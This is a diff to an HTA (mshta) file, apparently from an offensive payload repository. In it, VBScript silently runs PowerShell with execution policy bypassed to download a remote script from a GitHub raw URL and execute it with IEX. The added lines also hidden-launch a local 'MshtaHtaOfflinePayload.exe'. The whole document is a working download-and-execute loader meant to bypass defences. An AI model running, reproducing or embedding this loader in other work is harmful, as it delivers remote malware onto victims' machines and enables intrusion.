@@ -6,7 +6,11 @@
 
     <script language="VBScript">
     set oShell = CreateObject("Wscript.Shell")
-    oShell.Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/MshtaBypass/MshtaHta.ps1')"),0,true
+    oShell.Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/MshtaBypass/MshtaHta.ps1')"),0,true
+    self.close()
+	
+	set oShell1 = CreateObject("Wscript.Shell")
+    oShell1.Run("./MshtaHtaOfflinePayload.exe"),0,true
     self.close()
     </script>
     <hta:application
